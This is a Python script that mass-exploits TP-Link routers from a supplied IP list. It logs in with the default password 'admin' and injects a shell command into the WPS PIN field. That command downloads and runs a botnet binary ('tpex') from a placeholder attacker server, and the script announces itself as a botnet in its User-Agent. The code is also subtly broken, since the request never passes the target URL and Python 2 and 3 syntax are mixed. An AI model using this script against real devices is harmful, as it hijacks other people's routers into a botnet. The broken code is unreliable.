#Type pip install requests
#BY B4CKDOORARCHIVE.HOST
import threading, sys, time, random, socket, re, os, hashlib, struct, array, requests, base64, subprocess

ips = open(sys.argv[1], "r").readlines()

COOKIE = "1301a8c000c4c505"
PASSWORD = "admin"

cookies = {"gsScrollPos-8016": "0", "COOKIE": COOKIE}

password = hashlib.md5(PASSWORD.encode("utf-8")).hexdigest().upper()
encoded = "%s:%s" % (password, COOKIE)
encoded = hashlib.md5(encoded.encode("utf-8")).hexdigest().upper()

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
    "User-Agent": "Ar35, Botnet!",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "DNT": "1",
}

data_inject = [
    ("operation", "write"),
    ("option", "connect"),
    ("wps_setup_pin", "11480723;wget http://putyourserveriphere/tpex; chmod 777 *; ./tpex tplink"),
]

class exploit(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				url = "http://" + self.ip + "/data/wps.setup.json"
				requests.post(headers=headers, cookies=cookies, data=data_inject)
				print "[TP-Link] Loading " + self.ip
			except Exception as e:
				pass
				

for ip in ips:
	try:
		n = exploit(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass#b4ckdoor